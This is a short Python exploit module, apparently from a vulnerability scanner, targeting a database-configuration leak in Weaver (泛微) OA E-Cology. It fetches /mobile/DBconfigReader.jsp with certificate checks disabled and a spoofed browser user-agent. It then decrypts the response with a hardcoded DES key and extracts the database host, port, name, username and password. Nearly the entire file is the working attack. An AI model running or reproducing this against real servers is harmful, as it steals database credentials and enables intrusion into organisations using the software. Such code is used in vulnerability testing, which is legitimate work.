import pyDes
import requests



def desdecode(secret_key, s):
    cipherX = pyDes.des('        ')
    cipherX.setKey(secret_key)
    y = cipherX.decrypt(s)
    return y


def exp_check(url):
    headers = {
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 12_10) AppleWebKit/600.1.25 (KHTML, like Gecko) Version/12.0 Safari/1200.1.25'
    }

    url += '/mobile/DBconfigReader.jsp'
    try:
        requests.packages.urllib3.disable_warnings()
        res = requests.get(url=url, headers=headers, timeout=10, verify=False)
        if res.status_code == 200:
            # print('可能存在泛微OA E-Cology 数据库配置信息泄漏漏洞')
            res = res.content
            try:
                data = desdecode('1z2x3c4v5b6n', res.strip())
                data = data.strip()
                dbType = str(data).split(';')[0].split(':')[1]
                dbUrl = str(data).split(';')[0].split(':')[2].split('//')[1]
                dbPort = str(data).split(';')[0].split(':')[3]
                dbName = str(data).split(';')[1].split(',')[0].split('=')[1]
                dbUser = str(data).split(';')[1].split(',')[1].split('=')[1]
                dbPass = str(data).split(';')[1].split(',')[2].split('=')[1]
                return 1
            except:
                return 3
    except:
        return 3

def exp_cmd(url,cmd):
    pass